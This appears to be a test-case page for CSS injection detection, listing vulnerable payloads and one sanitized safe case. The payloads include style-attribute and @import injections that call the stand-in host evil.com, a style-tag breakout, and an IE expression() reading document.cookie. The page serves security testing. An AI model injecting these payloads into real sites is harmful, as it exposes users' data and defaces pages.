CSS Injection

CSS injection allows attackers to inject malicious CSS that can exfiltrate data or deface pages.

Vulnerable Test Cases

  • Inline Style - Injection in style attribute
    blue; background: url('http://evil.com/')
  • Style Tag - Injection in style element
    h1 { } body { background: red } h2
  • CSS Import - Attacker-controlled @import
    http://evil.com/malicious.css
  • CSS Expression - Legacy IE expression()
    alert(document.cookie)

False Positives (Safe)

  • Sanitized - Only whitelisted colors allowed
